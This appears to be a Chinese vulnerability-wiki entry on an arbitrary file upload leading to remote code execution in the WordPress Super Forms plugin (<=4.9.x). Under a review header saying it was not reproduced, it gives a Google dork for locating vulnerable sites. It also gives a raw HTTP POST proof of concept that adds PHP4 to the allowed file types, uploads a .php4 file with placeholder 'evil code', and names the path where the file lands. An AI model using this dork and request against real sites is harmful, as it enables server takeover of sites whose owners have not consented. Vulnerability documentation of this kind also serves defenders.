---
version: "All (<= 4.9.X)"
source: "Threekiii/Vulnerability-Wiki"
product: "WordPress Super Forms"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "WordPress-SuperForms-4.9-任意文件上传到远程代码执行"
prerequisites: "来源所述条件，未列明部分仍待核：<=4.9.x claimed; exposed upload handler trusts accept_file_types; server executes.php4 for RCE"
side_effects: "未执行；本文需注意的操作影响：php4扩展成功上传不等于现代服务器执行，需要PHP handler映射条件；上传路径按日期及返回id变化已说明，应保留；缺响应样本"
source_status: "unknown"
id: "vw-14e15fffa651ad6cbc52c91d"
entity_id: "ve-14e15fffa651ad6cbc52c91d"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：&lt;=4.9.x claimed; exposed upload handler trusts accept_file_types; server executes.php4 for RCE

- **实验改动边界（1）**：请求中混入箭头说明、换行boundary和filename占位，必须分离注释方可使用。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

- **适用与权限边界（2）**：php4扩展成功上传不等于现代服务器执行，需要PHP handler映射条件。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（3）**：All&lt;=4.9.x缺引入范围/固定版本；有EDB49490精确来源可核。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **事实待核（4）**：上传路径按日期及返回id变化已说明，应保留；缺响应样本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# WordPress SuperForms 4.9 任意文件上传到远程代码执行

## 漏洞描述

SuperForms官方链接：https://renstillmann.github.io/super-forms/#/

参考链接：

- https://www.exploit-db.com/exploits/49490

## 漏洞影响

```
All (<= 4.9.X)
```

## Google Dork

```
inurl:"/wp-content/plugins/super-forms/"
```

## 漏洞复现

poc：

```
POST /wp-content/plugins/super-forms/uploads/php/ HTTP/1.1
 <=== exploit end point
Host: localhost
User-Agent: UserAgent
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data;
boundary=---------------------------423513681827540048931513055996
Content-Length: 7058
Origin: localhost
Connection: close
Referer: localhost
Cookie: 

-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name="accept_file_types"

jpg|jpeg|png|gif|pdf|JPG|JPEG|PNG|GIF|PDF                        <=======
inject extension (|PHP4) to validate file to upload
-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name="max_file_size"

8000000
-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name="image_library"

0
-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name="files[]";
filename="filename.(extension)"    <====   inject code extension (.php4)
for example
Content-Type: application/pdf

Evil codes to be uploaded

-----------------------------423513681827540048931513055996--

# Uploaded Malicious File can  be Found in :
/wp-content/uploads/superforms/2021/01/<id>/filename.php4
u can get <id> from server reply .
```

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
